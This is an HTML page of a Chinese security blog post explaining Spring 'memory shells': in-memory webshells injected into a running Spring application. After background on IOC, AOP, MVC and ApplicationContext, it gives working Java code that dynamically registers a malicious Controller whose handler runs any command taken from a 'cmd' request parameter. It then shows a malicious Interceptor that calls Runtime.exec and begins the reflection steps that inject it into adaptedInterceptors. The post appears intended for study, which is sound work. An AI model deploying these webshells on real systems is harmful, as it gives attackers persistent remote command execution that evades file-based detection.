@@ -1,0 +1,561 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="generator" content="Gridea Pro 0.0.0-dev">
+<title>Spring内存马 | Bloyet&#39;s blog</title>
+<link rel="shortcut icon" href="/favicon.ico?v=1789062689">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="/styles/main.css">
+<link rel="alternate" type="application/rss+xml" title="Spring内存马 | Bloyet&#39;s blog - RSS Feed" href="/feed.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <meta name="description" content="在学习Spring内存马之前，作者打算好好恶补一下开发的基本知识，也算是给之前偷懒的自己补课吧 [【狂神说Java】JavaWeb入门到实战_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.1387.collection.video_card.click&amp;amp;vd_source=efb755bbe&amp;hellip;">
+<link rel="canonical" href="https://bloyet.github.io/post/spring-nei-cun-ma/">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Spring内存马","url":"https://bloyet.github.io/post/spring-nei-cun-ma/","description":"在学习Spring内存马之前，作者打算好好恶补一下开发的基本知识，也算是给之前偷懒的自己补课吧 [【狂神说Java】JavaWeb入门到实战_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.1387.collection.video_card.click\u0026amp;vd_source=efb755bbe\u0026hellip;","datePublished":"2025-09-04T01:29:34+08:00","dateModified":"2026-09-11T01:50:49+08:00","author":{"@type":"Person","name":"Bloyet's blog"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/images/avatar.png"},"name":"Bloyet's blog"}}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://bloyet.github.io","name":"Bloyet's blog","position":1},{"@type":"ListItem","item":"https://bloyet.github.io/post/spring-nei-cun-ma/","name":"Spring内存马","position":2}]}</script>
+<meta property="og:title" content="Spring内存马">
+<meta property="og:description" content="在学习Spring内存马之前，作者打算好好恶补一下开发的基本知识，也算是给之前偷懒的自己补课吧 [【狂神说Java】JavaWeb入门到实战_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.1387.collection.video_card.click&amp;amp;vd_source=efb755bbe&amp;hellip;">
+<meta property="og:url" content="https://bloyet.github.io/post/spring-nei-cun-ma/">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Bloyet's blog">
+<meta property="og:image" content="/images/avatar.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:url" content="https://bloyet.github.io/post/spring-nei-cun-ma/">
+<meta name="twitter:title" content="Spring内存马">
+<meta name="twitter:description" content="在学习Spring内存马之前，作者打算好好恶补一下开发的基本知识，也算是给之前偷懒的自己补课吧 [【狂神说Java】JavaWeb入门到实战_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.1387.collection.video_card.click&amp;amp;vd_source=efb755bbe&amp;hellip;">
+<meta name="twitter:image" content="/images/avatar.png">
+</head>
+  <body class="page-post">
+    <div class="main">
+      <div class="main-content">
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Spring内存马
+            </h2>
+            <div class="post-info">
+              <span>
+                2025-09-04
+              </span>
+              <span>
+                39 分钟阅读
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>在学习Spring内存马之前，作者打算好好恶补一下开发的基本知识，也算是给之前偷懒的自己补课吧</p>
+<p><a href="https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.1387.collection.video_card.click&amp;vd_source=efb755bbe6728e721e5cf06c81e4366a">【狂神说Java】JavaWeb入门到实战_哔哩哔哩_bilibili</a></p>
+<p><a href="https://www.bilibili.com/video/BV1PE411i7CV/?vd_source=efb755bbe6728e721e5cf06c81e4366a">【狂神说Java】SpringBoot最新教程IDEA版通俗易懂_哔哩哔哩_bilibili</a></p>
+<h1 id="spring">Spring介绍</h1>
+<p>Spring是一个轻量级的Java开源框架，用于配置、管理和维护Bean（组件）的一种框架，其核心理念就是IOC(Inversion of Control,控制反转) 和 AOP(AspectOrientedProgramming， 面向切面编程)。</p>
+<p>重点讲解一下核心内容</p>
+<h2 id="ioc">IOC</h2>
+<p>IOC的中文翻译为：控制反转</p>
+<p>核心理念是：把对象的创建和管理权交给框架，而不是程序员手动去创建</p>
+<p>例如：</p>
+<p>不用IOC</p>
+<pre><code class="language-java">UserService userService = new UserServiceImpl(); // 程序员自己new对象
+</code></pre>
+<p>使用IOC</p>
+<p>使用这个注解，我们的框架会在运行的时候自动进行创建</p>
+<pre><code class="language-java">@Autowired
+UserService userService; // 交给 Spring 容器来注入，不用自己new
+</code></pre>
+<h2 id="aop">AOP</h2>
+<p>AOP（Aspect-Oriented Programming）是一种通过预定义的切点（Pointcut）和通知（Advice）将横切关注点（Cross-Cutting Concerns）模块化的编程范式。它允许开发者将与业务逻辑无关但对多个模块都很重要的功能（如日志记录、事务管理、安全控制等）从核心业务逻辑中分离出来，从而提高系统的模块化、可维护性和可重用性</p>
+<p>通俗一点来说，就是 AOP 是一种让你把“每个地方都要写的重复逻辑”（比如日志、安全）集中写一遍，然后自动织入方法执行过程中的技术。</p>
+<h2 id="springmvc">SpringMVC</h2>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012907403_00043.png" alt="" /></p>
+<p>客户端发送Request，DispatcherServlet(等同于Controller控制器)，控制器接收到请求，来到HandlerMapping（在配置文件中配置），HandlerMapping会对URL进行解析，并判断当前URL该交给哪个Controller来处理，找到对应的Controller之后，Controller就跟Server、JavaBean进行交互，得到某一个值，并返回一个视图（ModelAndView过程），Dispathcher通过ViewResolver视图解析器,找到ModelAndView对象指定的视图对象,最后，视图对象负责渲染返回给客户端。 SpringMVC 的核心点就是 <code>DispatchServlet</code></p>
+<h2 id="font-stylecolorrgb50-50-93applicationcontextfont"><font style="color:rgb(50, 50, 93);">ApplicationContext</font></h2>
+<p>Spring 框架中，<code>BeanFactory</code> 接口是 <code>Spring</code> IoC容器 的实际代表者</p>
+<p>Spring容器就是ApplicationContext，它是一个接口继承于BeanFactory，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。我们可以从ApplicationContext中可以根据Bean的ID获取Bean。</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012909203_00044.png" alt="" /></p>
+<p>因此，<code>org.springframework.context.ApplicationContext</code>接口也代表了 <code>IoC容器</code> ，它负责实例化、定位、配置应用程序中的对象(<code>bean</code>)及建立这些对象间(<code>beans</code>)的依赖。</p>
+<p>DispatchServlet是SpringMVC中的前端控制器，处理所有请求的核心组件，而它创建的是一个Child Context，是一个独立的IOC容器（web层使用）</p>
+<p>还有一个是Root ApplicationContext，它是全局的，责管理项目中非 Web 层的 Bean ，由 ContextLoaderListener 在项目启动时创建，负责加载和管理所有非 Web 层 Bean， 保存到 ServletContext 中供后续子容器共享。</p>
+<p>所有的 child 可以取访问 Root 容器，但是 Root 却不能去访问 Child 中的内容</p>
+<p>当然 是所有的context（不仅仅是Root） 的信息都是会存在ServletContext中的</p>
+<h1 id="controller">Controller型内存马</h1>
+<p>在 Spring 中，当我们<strong>静态注册一个 Controller</strong> 时，确实会<strong>指定一个类的某个方法</strong>处理特定路由；当请求到达这个路由时，Spring 会自动调用这个方法。这是 Spring MVC 的核心功能之一</p>
+<p>那么动态注册的时候也是一样的道理，只不过是由Spring自动完成，变成了我们手动去注册，当我们动态注册了一个恶意的controller，当我们访问指定路由的时候，就可以自动调用恶意方法，进行命令执行</p>
+<p>那么现在就是来看怎么进行动态注册恶意的controller</p>
+<h2 id="heading">思路：</h2>
+<p>获取当前上下文</p>
+<p>注册恶意Controller</p>
+<p>配置路径映射（其实在动态注册Controller的时候，就会进行映射器的配置）</p>
+<h2 id="heading-1">获取上下文</h2>
+<p>一共有四种方法可以获取到上下文：</p>
+<h3 id="getcurrentwebapplicationcontext">getCurrentWebApplicationContext</h3>
+<pre><code class="language-java">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
+</code></pre>
+<p><strong>getCurrentWebApplicationContext</strong> 获得的是一个 <strong>XmlWebApplicationContext</strong> 实例类型的 <strong>Root WebApplicationContext</strong></p>
+<h3 id="webapplicationcontextutils">WebApplicationContextUtils</h3>
+<pre><code class="language-java">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
+</code></pre>
+<p>通过这种方法获得的也是一个 <code>Root WebApplicationContext</code>。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>来替换。</p>
+<h3 id="requestcontextutils">RequestContextUtils</h3>
+<pre><code class="language-java">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
+</code></pre>
+<p>通过 <code>ServletRequest</code> 类的实例来获得 <code>Child WebApplicationContext</code>。</p>
+<h3 id="font-stylecolorrgb50-50-93getattributefont"><strong><font style="color:rgb(50, 50, 93);">getAttribute</font></strong></h3>
+<pre><code class="language-java">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+</code></pre>
+<p>这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext</p>
+<h2 id="controller-1">注册恶意Controller</h2>
+<p>我们要想对Spring Controller 的动态注册，就是对<font style="color:#DF2A3F;"> RequestMappingHandlerMapping</font>注入的过程。</p>
+<p>RequestMappingHandlerMapping是springMVC里面的核心Bean，spring把我们的controller解析成RequestMappingInfo对象，然后再注册进RequestMappingHandlerMapping中，这样请求进来以后就可以根据请求地址调用到Controller类里面了。</p>
+<p>RequestMappingHandlerMapping对象本身是spring来管理的，可以通过**<font style="color:#DF2A3F;">ApplicationContext</font>**取到，所以并不需要我们新建</p>
+<p>而在SpringMVC框架下，会有两个ApplicationContext，</p>
+<p>一个是Spring IOC的上下文，这个是在java web框架的Listener里面配置，就是我们经常用的web.xml里面的org.springframework.web.context.ContextLoaderListener，由它来完成IOC容器的初始化和bean对象的注入。</p>
+<p>另外一个是ApplicationContext是由**<font style="color:#DF2A3F;">org.springframework.web.servlet.DispatcherServlet</font>**完成的，具体是在org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()这个方法做的。而这个过程里面会完成RequestMappingHandlerMapping这个对象的初始化。</p>
+<p>映射器： 它负责维护 <strong>URL 路径（或其他条件）到处理器（如 Controller 方法）的映射关系</strong>。</p>
+<p>Spring 2.5 开始到 Spring 3.1 之前一般使用<br />
+<code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br />
+映射器 ；</p>
+<p>Spring 3.1 开始及以后一般开始使用新的<br />
+<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code><br />
+映射器来支持@Contoller和@RequestMapping注解。</p>
+<h3 id="font-stylecolorrgb50-50-93registermappingfont"><font style="color:rgb(50, 50, 93);">registerMapping</font></h3>
+<p>在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012914081_00045.png" alt="" /></p>
+<p>在刚刚其实也说了 spring会把controller解析为RequestMappingInfo对象，然后在注册进RequestMappingHandlerMapping，所以我们可以看到在registerMapping方法中的参数，也是RequestMappingInfo类 所以在注册之前我们还需要看一下RequestMappingInfo类</p>
+<p>可以看到 构造方法是有非常多的参数的，但是有用的其实就两个 一共是</p>
+<pre><code class="language-java">private RequestMappingInfo(@Nullable String name, @Nullable PathPatternsRequestCondition pathPatternsCondition, @Nullable PatternsRequestCondition patternsCondition, RequestMethodsRequestCondition methodsCondition, ParamsRequestCondition paramsCondition, HeadersRequestCondition headersCondition, ConsumesRequestCondition consumesCondition, ProducesRequestCondition producesCondition, RequestConditionHolder customCondition, BuilderConfiguration options) {
+    Assert.isTrue(pathPatternsCondition != null || patternsCondition != null, &quot;Neither PathPatterns nor String patterns condition&quot;);
+    this.name = StringUtils.hasText(name) ? name : null;
+    this.pathPatternsCondition = pathPatternsCondition;
+    this.patternsCondition = patternsCondition;
+    this.methodsCondition = methodsCondition;
+    this.paramsCondition = paramsCondition;
+    this.headersCondition = headersCondition;
+    this.consumesCondition = consumesCondition;
+    this.producesCondition = producesCondition;
+    this.customConditionHolder = customCondition;
+    this.options = options;
+    this.hashCode = calculateHashCode(this.pathPatternsCondition, this.patternsCondition, this.methodsCondition, this.paramsCondition, this.headersCondition, this.consumesCondition, this.producesCondition, this.customConditionHolder);
+}
+</code></pre>
+<p>一个是指定controller的路径，也就是我们说的路由（设置好映射关系）</p>
+<p>另外一个是指定请求方式，设置为不限制就好</p>
+<p>registerMapping方法中的第二个参数，其实也就是我们对应的恶意类  第三个参数就是对应的恶意方法</p>
+<p>其实很好理解，RequestMappingInfo类指定我们恶意类的映射关系，使我们访问对应的路由时，就会对应一个类，而在MVC架构中，我们访问一个路由时，会自动调用一个方法的，那么这个方法，就是在这里进行指定的</p>
+<pre><code class="language-java">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例
+RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
+// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
+Method method = 恶意类的字节码.getDeclaredMethods())[0];
+// 3. 定义访问 controller 的 URL 地址
+PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);
+// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
+RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
+// 5. 在内存中动态注册 controller
+RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
+r.registerMapping(info, Class.forName(&quot;恶意Controller&quot;).newInstance(), method);
+</code></pre>
+<h3 id="font-stylecolorrgb85-85-85registerhandlerfont"><font style="color:rgb(85, 85, 85);">registerHandler</font></h3>
+<p><font style="color:rgb(85, 85, 85);">(版本古老，暂且就不复现了（：）<br />
+</font><font style="color:rgb(85, 85, 85);">参考上面的 HandlerMapping 接口继承关系图，针对使用 DefaultAnnotationHandlerMapping 映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractUrlHandlerMapping<br />
+</font><font style="color:rgb(85, 85, 85);">在其registerHandler()方法中<br />
+</font><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012917940_00046.png" alt="" /><font style="color:rgb(85, 85, 85);"><br />
+</font><font style="color:rgb(85, 85, 85);">该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中</font></p>
+<table>
+<thead>
+<tr>
+<th><code>java // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;me.landgrey.SSOLogin&quot;).newInstance()); // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. 反射获得 registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class); m1.setAccessible(true); // 4. 将 dynamicController 和 URL 注册到 handlerMap 中 m1.invoke(dh, &quot;/favicon&quot;, &quot;dynamicController&quot;); </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="font-stylecolorrgb85-85-85detecthandlermethodsfont"><font style="color:rgb(85, 85, 85);">detectHandlerMethods</font></h3>
+<p><font style="color:rgb(85, 85, 85);">参考上面的 HandlerMapping 接口继承关系图，针对使用 RequestMappingHandlerMapping 映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractHandlerMethodMapping<br />
+</font><font style="color:rgb(85, 85, 85);">在其detectHandlerMethods() 方法中</font></p>
+<table>
+<thead>
+<tr>
+<th><code>java protected void detectHandlerMethods(Object handler) {     Class&lt;?&gt; handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();     final Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);     Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() {         public boolean matches(Method method) {             return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;         }     });     Iterator var6 = methods.iterator();     while(var6.hasNext()) {         Method method = (Method)var6.next();         T mapping = this.getMappingForMethod(method, userType);         this.registerHandlerMethod(handler, method, mapping);     } } </code></th>
+</tr>
+</thead>
+</table>
+<p><font style="color:rgb(85, 85, 85);">该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean</font></p>
+<table>
+<thead>
+<tr>
+<th><code>java context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;恶意Controller&quot;).newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(&quot;detectHandlerMethods&quot;, Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, &quot;dynamicController&quot;); </code></th>
+</tr>
+</thead>
+</table>
+<h2 id="poc">POC</h2>
+<p>我这里就用springboot 2.5.6版本进行复现了</p>
+<p>思路还是很简单的：</p>
+<p>先获取当前的上下文，然后获取RequestMappingHandlerMapping 的实例，然后在反射获取我们写好的恶意类的恶意方法，然后获取并且设置我们想要把恶意类映射到的路径，和请求方法，设置到RequestMappingInfo类中，然后在调用RequestMappingHandlerMapping中的registerMapping方法，完成动态注入</p>
+<pre><code class="language-java">package org.example.spring.Controller;
+
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.ResponseBody;
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
+import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+
+import javax.servlet.http.HttpServletRequest;
+import java.io.IOException;
+import java.lang.reflect.Method;
+
+@RestController
+public class shell_controller {
+
+    @RequestMapping(&quot;/exec&quot;)
+    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {
+
+        //获取当前上下文环境
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+
+        //手动注册Controller
+        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
+        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
+        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
+        Method method = Shell.class.getDeclaredMethod(&quot;shell&quot;);
+        // 3. 定义访问 controller 的 URL 地址
+        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);
+        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
+        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
+        // 5. 在内存中动态注册 controller
+        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
+        r.registerMapping(info, new Shell(), method);
+
+    }
+
+    @ResponseBody
+    public class Shell{
+
+        public Shell(){}
+
+        public void shell() throws IOException {
+            //获取request
+            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
+            Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+        }
+    }
+
+}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012905499_00040.png" alt="" /></p>
+<p>这里有个问题，在springboot版本大于2.6.0的时候会出现一个报错导致命令执行失败</p>
+<p>解决办法参考：<a href="https://yyjccc.github.io/2024/03/12/Spring%E5%86%85%E5%AD%98%E9%A9%AC/">Spring内存马</a></p>
+<h1 id="font-stylecolorrgb85-85-85interceptorfont"><font style="color:rgb(85, 85, 85);">Interceptor型内存马</font></h1>
+<h2 id="interceptor">什么是Interceptor</h2>
+<p>Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。</p>
+<p>通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义</p>
+<p>通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义</p>
+<h2 id="interceptor-1">Interceptor示例</h2>
+<p>在springboot下写了：</p>
+<p>WebConfig</p>
+<pre><code class="language-java">package org.example.spring.Config;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.web.servlet.config.annotation.*;
+
+@Configuration
+public class WebConfig implements WebMvcConfigurer {
+
+    @Override
+    public void addInterceptors(InterceptorRegistry registry) {
+        registry.addInterceptor(new org.example.spring.Interceptor.MyInterceptor())
+                .addPathPatterns(&quot;/**&quot;)       // 拦截所有路径
+                .excludePathPatterns(&quot;/login&quot;); // 排除登录路径
+    }
+}
+</code></pre>
+<p>TestController</p>
+<pre><code class="language-java">package org.example.spring.Controller;
+
+import org.springframework.web.bind.annotation.*;
+
+@RestController
+public class TestController {
+
+    @GetMapping(&quot;/hello&quot;)
+    public String hello() {
+        return &quot;Hello, world!&quot;;
+    }
+
+    @GetMapping(&quot;/login&quot;)
+    public String login() {
+        return &quot;Login page (not intercepted)&quot;;
+    }
+}
+</code></pre>
+<p>MyInterceptor</p>
+<pre><code class="language-java">package org.example.spring.Interceptor;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.springframework.web.servlet.HandlerInterceptor;
+
+public class MyInterceptor implements HandlerInterceptor {
+
+    @Override
+    public boolean preHandle(HttpServletRequest request,
+                             HttpServletResponse response,
+                             Object handler) throws Exception {
+        System.out.println(&quot;进入拦截器：MyInterceptor -&gt; preHandle&quot;);
+        // 返回 true 继续执行，false 则终止请求链
+        return false;
+    }
+}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012921781_00048.png" alt="" /></p>
+<p>效果就跟Filter差不多，当访问的路由不是login，就会进入拦截器 如果返回true就继续执行，如果返回为false就中断这次原来对应的处理方法</p>
+<p>断点下在<font style="color:rgb(85, 85, 85);">ApplicationFilterChain#internalDoFilter，可以看到和我们之前学的Tomcat很像，但与Tomcat不同的是，当调用到HttpServlet#service时，最终会调用DispatcherServlet#doDispatch进行逻辑处理，这正是Spring的逻辑处理核心类。</font></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012924045_00049.png" alt="" /></p>
+<p>我们就直接来看核心类</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012905522_00042.png" alt="" /></p>
+<p>跟进getHandler方法：</p>
+<p>使用增强for语句 遍历handlerMappings来获取HandlerMapping类型的对象</p>
+<pre><code class="language-java">protected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
+    if (this.handlerMappings != null) {
+        for(HandlerMapping mapping : this.handlerMappings) {
+            HandlerExecutionChain handler = mapping.getHandler(request);
+            if (handler != null) {
+                return handler;
+            }
+        }
+    }
+
+    return null;
+}
+</code></pre>
+<p>实际上还会调用<font style="color:rgb(85, 85, 85);">org.springframework.web.servlet.handler.AbstractHandlerMapping 类的 getHandler 方法</font></p>
+<pre><code class="language-java">public final HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
+    Object handler = this.getHandlerInternal(request);
+    if (handler == null) {
+        handler = this.getDefaultHandler();
+    }
+
+    if (handler == null) {
+        return null;
+    } else {
+        if (handler instanceof String) {
+            String handlerName = (String)handler;
+            handler = this.obtainApplicationContext().getBean(handlerName);
+        }
+
+        if (!ServletRequestPathUtils.hasCachedPath(request)) {
+            this.initLookupPath(request);
+        }
+
+        HandlerExecutionChain executionChain = this.getHandlerExecutionChain(handler, request);
+        if (this.logger.isTraceEnabled()) {
+            this.logger.trace(&quot;Mapped to &quot; + handler);
+        } else if (this.logger.isDebugEnabled() &amp;&amp; !DispatcherType.ASYNC.equals(request.getDispatcherType())) {
+            this.logger.debug(&quot;Mapped to &quot; + executionChain.getHandler());
+        }
+
+        if (this.hasCorsConfigurationSource(handler) || CorsUtils.isPreFlightRequest(request)) {
+            CorsConfiguration config = this.getCorsConfiguration(handler, request);
+            if (this.getCorsConfigurationSource() != null) {
+                CorsConfiguration globalConfig = this.getCorsConfigurationSource().getCorsConfiguration(request);
+                config = globalConfig != null ? globalConfig.combine(config) : config;
+            }
+
+            if (config != null) {
+                config.validateAllowCredentials();
+            }
+
+            executionChain = this.getCorsHandlerExecutionChain(request, executionChain, config);
+        }
+
+        return executionChain;
+    }
+}
+</code></pre>
+<p>跟进getHandlerExecutionChain方法：</p>
+<p>通过遍历adaptedInterceptors 获取到所有的HandlerInterceptor</p>
+<pre><code class="language-java">protected HandlerExecutionChain getHandlerExecutionChain(Object handler, HttpServletRequest request) {
+    HandlerExecutionChain chain = handler instanceof HandlerExecutionChain ? (HandlerExecutionChain)handler : new HandlerExecutionChain(handler);
+
+    for(HandlerInterceptor interceptor : this.adaptedInterceptors) {
+        if (interceptor instanceof MappedInterceptor) {
+            MappedInterceptor mappedInterceptor = (MappedInterceptor)interceptor;
+            if (mappedInterceptor.matches(request)) {
+                chain.addInterceptor(mappedInterceptor.getInterceptor());
+            }
+        } else {
+            chain.addInterceptor(interceptor);
+        }
+    }
+
+    return chain;
+}
+</code></pre>
+<p>找到了我们自定义的interceptor</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012905506_00041.png" alt="" /></p>
+<p>然后在通过chain.addInterceptor 把所有的interceptor<font style="color:rgb(85, 85, 85);">添加到HandlerExecutionChain中，然后就结束了，回到</font></p>
+<p><font style="color:rgb(85, 85, 85);">一开始的DispatcherServlet#doDispatch()中，调用mappedHandler.applyPreHandle方法</font></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012919580_00047.png" alt="" /></p>
+<p><font style="color:rgb(85, 85, 85);">然后遍历调用Interceptor中的preHandle()拦截方法</font></p>
+<p><font style="color:rgb(85, 85, 85);"></font></p>
+<h2 id="font-stylecolorrgb85-85-85font"><font style="color:rgb(85, 85, 85);">实现思路</font></h2>
+<p><font style="color:rgb(85, 85, 85);">获取上下文</font></p>
+<p><font style="color:rgb(85, 85, 85);">实现一个恶意Interceptor类</font></p>
+<p><font style="color:rgb(85, 85, 85);">动态注册进内存</font></p>
+<p><font style="color:rgb(85, 85, 85);"></font></p>
+<h3 id="font-stylecolorrgb85-85-85font-1"><font style="color:rgb(85, 85, 85);">获取上下文</font></h3>
+<p>获取上下文和Controller思路是一样的</p>
+<p>同时，我们通过刚刚的调试可以知道，<font style="color:rgb(85, 85, 85);">Interceptor类的信息是存储在adaptedInterceptors中的，所以我们需要反射获取到这个属性并且把恶意类添加进去</font></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012905470_00039.png" alt="" /></p>
+<p>所以我们可以通过获取上下文来 获取到这个对象（Bean）的<font style="color:rgb(85, 85, 85);">adaptedInterceptors属性</font></p>
+<p><font style="color:rgb(85, 85, 85);"></font></p>
+<h3 id="font-stylecolorrgb85-85-85interceptorfont-1"><font style="color:rgb(85, 85, 85);">实现恶意Interceptor类</font></h3>
+<p>我们需要实现HandlerInterceptor类，重写preHandle方法</p>
+<pre><code class="language-java">public class MyInterceptor implements HandlerInterceptor {
+
+    @Override
+    public boolean preHandle(HttpServletRequest request,
+                             HttpServletResponse response,
+                             Object handler) throws Exception {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+        // 返回 true 继续执行，false 则终止请求链
+        return false;
+
+    }
+}
+</code></pre>
+<h3 id="heading-2">动态注入</h3>
+<p><font style="color:rgb(85, 85, 85);">adaptedInterceptors其实是一个数组，我们直接用add方法添加我们的恶意类就行，这里要注意的是我们</font></p>
+<pre><code class="language-java">实际上获取到的是它的实现类org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping
+所以是不能直接通过他来反射获取字段
+AbstractHandlerMapping handlerMapping = (AbstractHandlerMapping) context.getBean(AbstractHandlerMapping.class);
+
+</code></pre>
